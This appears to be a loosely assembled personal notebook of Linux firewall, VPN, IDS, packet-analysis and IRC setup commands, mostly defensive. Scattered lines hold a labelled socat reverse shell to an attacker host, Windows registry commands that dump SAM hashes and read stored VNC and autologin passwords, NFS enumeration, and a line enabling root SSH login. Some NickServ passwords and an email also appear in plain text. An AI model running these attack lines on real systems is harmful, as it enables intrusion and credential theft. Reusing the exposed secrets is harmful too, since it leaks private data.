selinux-autorelabel.target apt-daily.timer acmetool.timer exim4-base.timer geoipupdate.timer anbox-container-manager.service apache2@.service apache-htcacheclean.service apache-htcacheclean@.service apt-daily-upgrade.service apt-daily.service arpwatch.service arpwatch@.service fcoe.service geoipupdate.service isc-dhcp-server.service iscsi-shutdown.service libvirt-guests.service lxc@.service openvpn-server@.service phpsessionclean.service rsync.service sanoid-prune.service sanoid.service sheepdog.service virtualbox-guest-utils.service virtualbox.service virtlogd.service virtlockd.service xendomains.service xencommons.service Xplico.service ypserv.service yppasswdd.service ykval-queue.service ypxfrd.service libvirtd-admin.socket libvirtd-ro.socket libvirtd-tcp.socket libvirtd-tls.socket libvirtd.socket virtlockd-admin.socket virtlockd.socket virtlogd-admin.socket virtlogd.socket selinux-autorelabel.target smartcard.target mdcheck_start.timer phpsessionclean.timer sanoid.timer mdadm-last-resort@.timer mdcheck_continue.timer 

syslog.service

enable a kill switch?
Add the following lines under the [Interface] section 
of the WireGuard configuration files found in 
/etc/wireguard/

PostUp  =  iptables -I OUTPUT ! -o %i -m mark ! --mark $(wg show %i fwmark) -m addrtype ! --dst-type LOCAL -j REJECT && ip6tables -I OUTPUT ! -o %i -m mark ! --mark $(wg show %i fwmark) -m addrtype ! --dst-type LOCAL -j REJECT
PreDown = iptables -D OUTPUT ! -o %i -m mark ! --mark $(wg show  %i fwmark) -m addrtype ! --dst-type LOCAL -j REJECT && ip6tables -D OUTPUT ! -o %i -m mark ! --mark $(wg show  %i fwmark) -m addrtype ! --dst-type LOCAL -j REJECT

https://mullvad.net/en/help/wireguard-and-mullvad-vpn/


iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
iptables -I INPUT -p udp --dport 1194 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j SNAT --to 139.59.1.155



/sbin/iptables -t nat -A BYPASS -p udp --dport 1194 -d $ovpn_server1 -j ACCEPT
/sbin/iptables -t nat -A BYPASS -p udp --dport 1194 -d $ovpn_server2 -j ACCEPT


### default INPUT LOG rule
$IPTABLES -A INPUT ! -i lo -j LOG --log-prefix "DROP " --log-ip-options --log-tcp-options

### default OUTPUT LOG rule
$IPTABLES -A OUTPUT ! -o lo -j LOG --log-prefix "DROP " --log-ip-options --log-tcp-options

### default LOG rule
$IPTABLES -A FORWARD ! -i lo -j LOG --log-prefix "DROP " --log-ip-options --log-tcp-options


echo "[+] Setting up FORWARD chain..."

### state tracking rules
$IPTABLES -A FORWARD -m conntrack --ctstate INVALID -j LOG --log-prefix "DROP INVALID " --log-ip-options --log-tcp-options
$IPTABLES -A FORWARD -m conntrack --ctstate INVALID -j DROP

### make sure that loopback traffic is accepted
$IPTABLES -A INPUT -i lo -j ACCEPT



echo "Enabling GlobaLeaks Torrification..."
# OUTBOUND
# All outbound connections from GlobaLeaks goes trough Tor 
iptables -t nat -A OUTPUT ! -o lo -p tcp -m owner --uid-owner globaleaks -m tcp -j REDIRECT --to-ports 9040
iptables -t nat -A OUTPUT ! -o lo -p udp -m owner --uid-owner globaleaks -m udp --dport 53 -j REDIRECT --to-ports 53
iptables -t filter -A OUTPUT -p tcp -m owner --uid-owner globaleaks -m tcp --dport 9040 -j ACCEPT
iptables -t filter -A OUTPUT -p udp -m owner --uid-owner globaleaks -m udp --dport 53 -j ACCEPT
iptables -t filter -A OUTPUT ! -o lo -m owner --uid-owner globaleaks -j DROP


ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement -m hl --hl-eq 255 -j ACCEPT
ip6tables -A INPUT -p icmpv6 --icmpv6-type neighbor-solicitation -m hl --hl-eq 255 -j ACCEPT
ip6tables -A INPUT -p icmpv6 --icmpv6-type neighbor-advertisement -m hl --hl-eq 255 -j ACCEPT

        $IP6TABLES -A INPUT -m state --state INVALID -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags SYN,RST SYN,RST -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags FIN,RST FIN,RST -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags ACK,FIN FIN -j DROP
        $IP6TABLES -A INPUT -p tcp -m tcp --tcp-flags ACK,URG URG -j DROP

# Drop invalid
$IPTABLES -A INPUT -m state --state INVALID -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags SYN,RST SYN,RST -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags FIN,RST FIN,RST -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags ACK,FIN FIN -j DROP
$IPTABLES -A INPUT -p tcp -m tcp --tcp-flags ACK,URG URG -j DROP


### state tracking rules
$IPTABLES -A INPUT -m conntrack --ctstate INVALID -j LOG --log-prefix "DROP INVALID " --log-ip-options --log-tcp-options
$IPTABLES -A INPUT -m conntrack --ctstate INVALID -j DROP

### state tracking rules
$IPTABLES -A OUTPUT -m conntrack --ctstate INVALID -j LOG --log-prefix "DROP INVALID " --log-ip-options --log-tcp-options
$IPTABLES -A OUTPUT -m conntrack --ctstate INVALID -j DROP

$IPTABLES -A OUTPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 443 -m conntrack --ctstate NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 53 -m conntrack --ctstate NEW -j ACCEPT
$IPTABLES -A OUTPUT -p udp --dport 53 -m conntrack --ctstate NEW -j ACCEPT


$IP6TABLES -A INPUT -p icmpv6 -j DROP

# Allow mdns
$IPTABLES -A INPUT -p udp -s 192.168.0.0/16 --sport 5353 --dport 5353 -d 224.0.0.251 -j DROP
$IPTABLES -A INPUT -p udp -s 192.168.0.0/16 --sport 17500 --dport 17500 -d 255.255.255.255 -j DROP

# Allow NETBIOS
$IPTABLES -A INPUT -p udp -s 192.168.0.0/16 --sport 138 --dport 138 -j DROP

# Allow SNMP response
$IPTABLES -A INPUT -p udp --sport 161 -j DROP

# Allow Skype
$IPTABLES -A INPUT -m state --state NEW -m udp -p udp --dport 26187 -j DROP
$IPTABLES -A INPUT -m state --state NEW -m tcp -p tcp --dport 26187 -j DROP


echo >> /etc/network/if-pre-up.d/iptables
echo "" >> /etc/network/if-pre-up.d/iptables
iptables-restore \< /etc/iptables.rules >> /etc/network/if-pre-up.d/iptables
echo ip6tables-restore \< /etc/ip6tables.rules >> /etc/network/if-pre-up.d/iptables

systemctl enable iptables.service
systemctl enable ip6tables.service


service iptables save
service ip6tables save
iptables-save > /root/iptables.save
cat /root/iptables.save | iptables-restore
ip6tables-save > /etc/iptables/ip6tables.rules


iptables-persistent iptables-persistent/autosave_v4 boolean true
iptables-persistent iptables-persistent/autosave_v6 boolean true
iptables-save > /etc/iptables/IPTable-RulesAppended.v4 

systemctl enable fail2ban
sudo systemctl restart fail2ban
fail2ban-client status
fail2ban-client set
journalctl -u fail2ban.service -f
tail -F /var/log/fail2ban.log 


systemctl start firewalld
systemctl enable firewalld
systemctl status firewalld
firewall-cmd --state
firewall-cmd --reload


firewall-cmd --add-service openvpn
firewall-cmd --permanent --add-service openvpn
firewall-cmd --permanent --add-service=dns
firewall-cmd --add-masquerade
firewall-cmd --permanent --add-masquerade
firewall-cmd --permanent --zone=public --add-port=443/tcp
firewall-cmd --permanent --zone=public --add-port=443/udp

firewall-cmd --get-icmptypes && firewall-cmd --get-services && firewall-cmd --get-zones && firewall-cmd --list-all && firewall-cmd --list-lockdown-whitelist-users && firewall-cmd --list-services && firewall-cmd --list-source-ports && firewall-cmd --list-icmp-blocks && firewall-cmd --list-rich-rules && firewall-cmd --state && firewall-cmd --get-helpers && firewall-cmd --get-log-denied && firewall-cmd --get-short && firewall-cmd --query-icmp-block-inversion && firewall-cmd --get-ipset-types && firewall-cmd --list-lockdown-whitelist-users && firewall-cmd --list-lockdown-whitelist-commands && firewall-cmd --list-lockdown-whitelist-uids && firewall-cmd --list-ports && firewall-cmd --list-protocols && firewall-cmd --list-interfaces && firewall-cmd --get-active-zones && firewall-cmd --list-source-ports && firewall-cmd --list-sources

firewall-cmd --get-default-zone
firewall-cmd --set-default-zone=internal
firewall-cmd --get-active-zones

firewall-cmd --zone=public --list-all
firewall-cmd --list-all-zones
firewall-cmd --zone=dmz --list-all
firewall-cmd --get-services
firewall-cmd --direct --get-all-chains
firewall-cmd --direct --get-all-rules

firewall-cmd --set-default-zone=
firewall-cmd --zone=dmz --add-interface=eth0
firewall-cmd --zone=dmz --add-service=http --permanent
sudo firewall-cmd --zone=dmz --add-service=https --permanent

firewall-cmd --zone=public --list-rich-rules
sudo firewall-cmd --zone=public --add-rich-rule 'rule family="ipv4" source address=192.0.2.0 accept'
sudo firewall-cmd --zone=public --add-rich-rule 'rule family=ipv4 source address=192.0.2.0 forward-port port=80 protocol=tcp to-port=6532'
sudo firewall-cmd --zone=public --add-rich-rule 'rule family=ipv4 forward-port port=80 protocol=tcp to-port=8080 to-addr=198.51.100.0'




Grep ip addresses from access attempts to a page 
and add them to an ipset referenced by an iptables rule



grep page.php /var/log/httpd/access_log|awk '{print $1}'|sort|uniq|perl -e 'while (<STDIN>){chomp; $cmd=`ipset add banned -! -q $_`; }'


wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptables -A INPUT -s "$1" -j DROP"}'



Retrieve top ip threats from http://isc.sans.org/sources.html and add them into iptables output chain.

curl -s http://isc.sans.org/sources.html|grep "ipinfo.html"|awk -F"ip=" {'print $2'}|awk -F"\"" {'print $1'}|xargs -n1 sudo iptables -A OUTPUT -j DROP -d > 2&>1



 Block all FaceBook traffic 
ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done


tail -f /var/www/logs/domain.com.log | grep "POST /scripts/blog-post.php" | grep -v 192.168. | awk '{print $1}' | xargs -I{} iptables -I DDOS -s {} -j DROP




 Block all IPv4 addresses that has brute forcing our ssh server 
for idiots in "$(cat /var/log/auth.log|grep invalid| grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b')"; do iptables -A INPUT -s "$idiots" -j DROP; done


 Cloack an IP range from some IPs via iptables 
iptables -A FORWARD -i br0 -m iprange --src-range 192.168.0.x-192.168.0.y -m iprange --dst-range 192.168.0.w-192.168.0.z -j DROP


ipset create myset-ip hash:ip
ipset -N myset-ip iphash

ipset add myset-ip 1.1.1.1
iptables -I INPUT -m set --match-set myset-ip src -j DROP
ipset save > /etc/ipset.conf

ipset list








echo "##-=============================================-##"
echo "    [+] A tunnel with full TLS-based security      "
echo "##-=============================================-##"


echo "##-==============-##"
echo "    [+] On Bob:     "
echo "##-==============-##"
openvpn  --remote  alice.example.com  --dev  tun1  --ifconfig  10.4.0.1 10.4.0.2 --tls-client --ca ca.crt --cert client.crt --key client.key --reneg-sec 60 --verb 5


echo "##-================-##"
echo "    [+] On Alice:     "
echo "##-================-##"
openvpn --remote bob.example.com --dev tun1 --ifconfig 10.4.0.2 10.4.0.1 --tls-server --dh dh1024.pem --ca ca.crt  --cert  server.crt  --key server.key --reneg-sec 60 --verb 5







echo "##-=============================================-##"
echo "      [+] A tunnel with static-key security      "
echo "##-=============================================-##"


echo "##-=============================-##"
echo "    [+] Generate A Static Key:     "
echo "##-=============================-##"
openvpn --genkey --secret key


echo "##-==============-##"
echo "    [+] On Bob:     "
echo "##-==============-##"
openvpn --remote alice.example.com --dev tun1 --ifconfig 10.4.0.1 10.4.0.2 --verb 5 --secret key


echo "##-================-##"
echo "    [+] On Alice:     "
echo "##-================-##"
openvpn --remote bob.example.com --dev tun1 --ifconfig 10.4.0.2 10.4.0.1 --verb 5 --secret key



## Generate a public and private certificate on the client

wg genkey | tee client_private_key | wg pubkey > client_public_key







Generate a private and public key pair for the WireGuard server:
wg genkey | tee privatekey | wg pubkey > publickey


Create the file /etc/wireguard/wg0.conf 

enter your server’s private key in the PrivateKey field, and its IP addresses in the Address field.

[Interface]
PrivateKey = <Private Key>
Address = 10.0.0.1/24, fd86:ea04:1115::1/64
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; ip6tables -A FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE; ip6tables -D FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
SaveConfig = true





Address defines the private IPv4 and IPv6 addresses for the WireGuard server. 
Each peer in the VPN network should have a unique value for this field.

  [+]  ListenPort specifies which port WireGuard will use for incoming connections.

  [+]  PostUp and PostDown defines steps to be run after 
        the interface is turned on or off, respectively. 

  In this case, iptables is used to set Linux IP masquerade rules 
to allow all the clients to share the server’s IPv4 and IPv6 address. 
The rules will then be cleared once the tunnel is down.


  [+]  SaveConfig tells the configuration file to automatically update 
        whenever a new peer is added while the service is running.





nmap -sV -Pn -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 172.31.2.10

rpcinfo -s 172.31.2.10
 
showmount -e 172.31.2.10

mount -t nfs 172.31.2.10:/backup /tmp/nfs -o nolock
















Allow SSH connections and WireGuard’s VPN port:

Start Wireguard:

wg-quick up wg0



Enable the Wireguard service to automatically restart on boot:
sudo systemctl enable wg-quick@wg0

Check if the VPN tunnel is running with the following two commands:

sudo wg show
ifconfig wg0



Verifying Traffic Routing Integrity:

##  Wireguard configuration in the previous section set ListenPort = 30003
tcpdump -i en0 -l -nn host 8.8.8.8 or udp port 30003

## use tcpdump on the en0 interface and then ping 8.8.8.8
tcpdump -i wg0 -l -nn




Generate a key pair for the client if you have not already:

umask 077
wg genkey | tee privatekey | wg pubkey > publickey



The main difference between the client and the server’s configuration file, wg0.conf, is it must contain its own IP addresses and does not contain the ListenPort, PostUP, PostDown, and SaveConfig values.

/etc/wireguard/wg0.conf


    [Interface]
    PrivateKey = <Output of privatekey file that contains your private key>
    Address = 10.0.0.2/24, fd86:ea04:1115::5/64



[Peer]
PublicKey = <Server Public key>
Endpoint = <Server Public IP>:51820
AllowedIPs = 10.0.0.2/24, fd86:ea04:1115::5/64



Method 1

    The first method is to directly edit the client’s wg0.conf file with the server’s public key, public IP address, and port:

/etc/wireguard/wg0.conf 


Enable the wg service on both the client and server:

wg-quick up wg0
systemctl enable wg-quick@wg0




Method 2

Run the following command from the server. Replace the example IP addresses with those of the client:

sudo wg set wg0 peer <Client Public Key> endpoint <Client IP address>:51820 allowed-ips 203.0.113.12/24,fd86:ea04:1115::5/64


wg-quick save wg0







Step 4. Convert the DD image to a the qcow2 disk format with the 'qemu-img' utility.

qemu-img convert -O qcow2 /storage/location/snapshot.image /storage/location/snapshot.qcow2





ssh -f -N -D 1234 mullvad@68.235.43.114


SERVER_IP=$(nslookup $1 | grep "Address: " | cut -d " " -f 2 -s)



└──╼ $nslookup us-chi-br-001.mullvad.net
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
Name:	us-chi-br-001.mullvad.net
Address: 68.235.43.114







 curl -q -s -A "$NAME" -i -m 30 -X TRACE -o $logfile $prefix$target:$port/



## performing nikto webscan on port $port... "
nikto -host $target:$port -Format txt -output $logfile

curl -A "$NAME" -q --insecure -m 10 --dump-header $logfile https://$target:$port



performing whatweb fingerprinting on $target port $port...

whatweb -a3 --color never http://$target:$port --log-brief $logfile



testing server at $p with credentials from $AUTH_FILE"
        COMMAND="smbclient -L $p -A $AUTH_FILE


SQL-Brute
SQL-Ninja
EvilAngel
w3af
XSS-Harvest
websploit
lbd




RUN sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd





SkipFish

bwm-ng
iptraf
tcptrack

Httsquash

tcpdump -s9000 -w output1        # create tcpdump capture file

chaosreader output1              # extract recognised sessions, or,

chaosreader -ve output1          # gimme everything, or,

chaosreader -p 20,21,23 output1  # only ftp and telnet





chaosreader.pl suspicious-time.pcap
 
cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
 
cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
 
 
for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
 
 
 
for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u | awk '{print $5}' > url.lst
 
 
wget https://raw.githubusercontent.com/Open-Sec/forensics-scripts/master/check-urls-virustotal.py
 
 
python check-urls-virustotal.py url.lst
 
 
 
------------------------------------------------------------------------
 
 
 
 
 
tshark -i en1 -z proto,colinfo,http.request.uri,http.request.uri -R http.request.uri

 
#############################
# PCAP Analysis with tshark #
# Note: run as regular user #
#############################

 
tshark -i ens3 -r suspicious-time.pcap -qz io,phs
 
tshark -r suspicious-time.pcap -qz ip_hosts,tree
 
tshark -r suspicious-time.pcap -Y "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
 
tshark -r suspicious-time.pcap -Y "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
 

Monitor DNS queries and replies:

tshark -Y "dns.flags.response == 1" -Tfields -e frame.time_delta -e dns.qry.name -e dns.a -Eseparator=


## Monitor HTTP requests and responses:
tshark -Y "http.request or http.response" -Tfields -e ip.dst -e http.request.full_uri -e http.request.method -e http.response.code -e http.response.phrase -Eseparator=/s
 


tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
 

##  Monitor x509 (SSL/TLS) certificates:
tshark -Y "ssl.handshake.certificate" -Tfields -e ip.src -e x509sat.uTF8String -e x509sat.printableString -e x509sat.universalString -e x509sat.IA5String -e x509sat.teletexString -Eseparator=/s -Equote=d




whois rapidshare.com.eyu32.ru
 
whois sploitme.com.cn
 
tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
 
tshark -r suspicious-time.pcap -qz http_req,tree
 
tshark -r suspicious-time.pcap -Y "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
 
tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
------------------------------------------------------------------------
 





reverse_shell
attacker

    socat file:`tty`,raw,echo=0 tcp-listen:12345

target:

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker-ip:12345"


sshuttle --dns -vvr user@server 0/0




reg.exe

    service: sam
    tactics: credential_access

dump sam database

    reg save HKLM\sam sam
    reg save HKLM\system system

query vnc passwords

    reg query "HKCU\Software\ORL\WinVNC3\Password"

Windows autologin

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

Xe1phix-[FWSnort]
FWSnort-[IPTables-Cron].sh


BADIPS=$(egrep -v -E "^#|^$" /etc/psad/scripts/blocked.fw)

echo "* Blocking all bad ips in file /etc/psad/scripts/blocked.fw"
for ip in $BADIPS
do
    $IPT -A INPUT -s $ip -j DROP
    $IPT -A OUTPUT -d $ip -j DROP
done


--snort-conf /etc/snort/snort.conf

--include-type ftp,mysql
--restrict-intf eth0




#############################
# Understanding Snort rules #
#############################
Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
 
Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
 
Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
 
Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
 
Field 5: Traffic Direction (->)
 
Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
 
Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
 
Field 8: MSG - what is actually displayed on the analysts machine
 

snort -q -i wlan0 -c -A console /etc/snort/snort.conf

fwsnort --update-rules
 
fwsnort --ipt-apply
 
iptables-restore < /etc/fwsnort/snort_rules/emerging-all.rules
fwsnort --snort-rfile web-misc.rules,web-cgi.rules,backdoor.rules --no-ipt-sync
fwsnort --snort-rfile ultrasurf.rules --no-ipt-sync

fwsnort --snort-sid 2281 --ipt-drop


UPDATE_RULES_URL        http://rules.emergingthreats.net/open/snort-edge/emerging-all.rules;
      UPDATE_RULES_URL        http://rules.emergingthreats.net/fwrules/emerging-IPTABLES-ALL.rules;"



Logfile: /var/log/fwsnort/fwsnort.log
iptables script: /etc/fwsnort/fwsnort.sh
Main fwsnort iptables-save file: /etc/fwsnort/fwsnort.save
 /sbin/iptables-restore < /etc/fwsnort/fwsnort.save


psad --fw-list
psad --fw-block-ip
psad --fw-block-ip $1



highly verbose mode with the --debug switch:
psad --debug

psad --Flush


/etc/psad/psad.conf
      HOME_NET                    YOUR_NETWORK_CIDR; #EX: 192.168.0.0/24
      EXTERNAL_NET                !$HOME_NET; #Denotes anything not within your network CIDR
      ***In @netson's original post he points the log to psad-iptables.log, which isn't referenced anywhere else in the config, fixed the typo***
      IPT_SYSLOG_FILE             /var/log/iptables.log; #Points to the new log created earlier
      ENABLE_INTF_LOCAL_NETS         N; #Prevents PSAD from assuming the network automatically
      EXPECT_TCP_OPTIONS             Y;"
      psad --sig-update
      psad -K
      psad --fw-include-ips



SPA packet from a spoofed source address
fwknop --Spoof-src 207.132.X.X -A tcp/22 --gpg-home-dir
/home/mbr/.gnupg --Spoof-user mbr --gpg-recip "fwknop_server" --gpg-sign
"fwknop_client" --quiet -R -k spaserver


ssh -K "--gpg-recip ABCD1234 --gpg-sign DEFG5678 -A tcp/22
-R -k spaserver" mbr@spaserver

Oct 17 15:53:39 spaserver fwknopd: received valid GnuPG encrypted packet
(signed with required key ID: A742839F) from: 204.23.X.X, remote user: mbr
Oct 17 15:53:39 spaserver fwknopd: adding FWKNOP_INPUT ACCEPT rule for
204.23.X.X -> tcp/22 (30 seconds)


psad -m iptables.data -A --analysis-fields "src:60.248.80.102"



psad -m iptables.data --gnuplot --CSV-fields "src:11.11.0.0/16
dst:not11.11.0.0/16 dp" --CSV-regex "SYN URGP=" --gnuplot-graph points
--gnuplot-file-prefix fig14-13 --gnuplot-view 71,63









journalctl --setup-keys







get all pdf and zips from a website using wget

wget --reject html,htm --accept pdf,zip -rl1 url


If the site uses https, use: 

wget --reject html,htm --accept pdf,zip -rl1 --no-check-certificate https-url




TOR











Creating a self-signed certificate

generate a certificate with the following command:

openssl req -x509 -new -newkey rsa:4096 -sha256 -days 1096 -nodes -out freenode.pem -keyout freenode.pem

Inspecting your certificate

openssl x509 -in freenode.pem -noout -enddate

The fingerprint can be checked with the following command:

openssl x509 -in freenode.pem -noout -fingerprint -sha1 | awk -F= '{gsub(":",""); print tolower ($2)}'


Connecting to freenode with your certificate


##  allow NickServ to recognise you based on your certificate

/whois xe1phix


##  authorise your current certificate fingerprint:

/msg NickServ CERT ADD cd0f139ea4b058590b1dd183e8ceace169775bc07bdea88263d81965bca83e28b50b0041b48122f03625ca8a16d6b1e4769724365e3a7f74f9c2e76d8715301a




Connect to Libera.Chat with TLS at 
irc.libera.chat 
port 6697

irc.libera.chat
IPv4 only 	irc.ipv4.libera.chat
US & Canada 	irc.us.libera.chat

https://web.libera.chat/#libera
https://web.libera.chat/?nick=Guest?#libera






Plain-text 	6665-6667, 8000-8002
TLS 	6697, 7000, 7070





Accessing Libera.Chat Via Tor

Libera.Chat is reachable via Tor using our onion service.
This service requires public-key SASL authentication 

Tor SOCKS proxy (typically localhost:9050)

Connect to palladium.libera.chat.


# torrc entry for libera.chat onion service
MapAddress palladium.libera.chat libera75jm6of4wxpxt4aynol3xjmbtxgfyjpu34ss4d7r7q2v5zrpyd.onion






/nick xe1phix

##  Register your IRC nick:
/msg NickServ REGISTER zBJx8AcfYKj2cJ xe1phix@protonmail.ch

##  Verify the IRC nick:
/msg NickServ VERIFY REGISTER xe1phix D43GfKtKiOUvj5j7


##  identify to your primary account:
/msg NickServ IDENTIFY xe1phix D43GfKtKiOUvj5j7


##  group the new nick to your account
/msg NickServ GROUP


Logging In
/connect irc.libera.chat 6667 YourNick:YourPassword

manually identify:

/msg NickServ IDENTIFY YourNick YourPassword




https://kiwiirc.com/nextclient/irc.libera.chat/
https://web.libera.chat/

irc.libera.chat/+6697
ircs://irc.libera.chat:6697



openssl req -x509 -new -newkey rsa:4096 -sha256 -days 1096 -nodes -out libera.pem -keyout libera.pem


##  Inspecting your certificate
openssl x509 -in libera.pem -noout -enddate


##  Check The fingerprint:
openssl x509 -in libera.pem -noout -fingerprint -sha512 | awk -F= '{gsub(":",""); print tolower ($2)}'


/server add -auto -ssl -ssl_cert ~/.irssi/certs/libera.pem -network libera irc.libera.chat 6697


~/.config/hexchat/


/connect irc.libera.chat 6667 YourNick:YourPassword

/msg NickServ IDENTIFY YourNick YourPassword


/msg ChanServ help REGISTER

/msg nickserv set enforce on




#parrotsec
#i2p
#linux-hardening
#cialug


#gentoo-security
#wireguard
#offsec
#opsec
#ossec
#ccc
##kernel
#snort


https://www.kernel.org/doc/html/latest/admin-guide/kernel-parameters.html
https://www.kernel.org/doc/html/latest/networking/ip-sysctl.html
https://www.kernel.org/doc/html/latest/networking/nf_conntrack-sysctl.html?highlight=namespace

https://www.kernel.org/doc/html/latest/filesystems/proc.html?highlight=namespace


A Complete Guide on IPv6 Attack and Defense
https://www.sans.org/white-papers/33904/
https://github.com/vanhauser-thc/thc-ipv6


https://freenode.net/kb/answer/certfp
https://libera.chat/guides/connect
https://libera.chat/guides/certfp.html
https://trac.torproject.org/projects/tor/wiki/doc/TorifyHOWTO/IrcSilc

https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/cgroup-v2.rst



https://github.com/micahflee/onionshare/wiki
https://github.com/AnarchoTechNYC/meta/tree/main/train-the-trainers/mr-robots-netflix-n-hack/week-1/secretly-sharing-files-with-onionshare-and-tor-browser





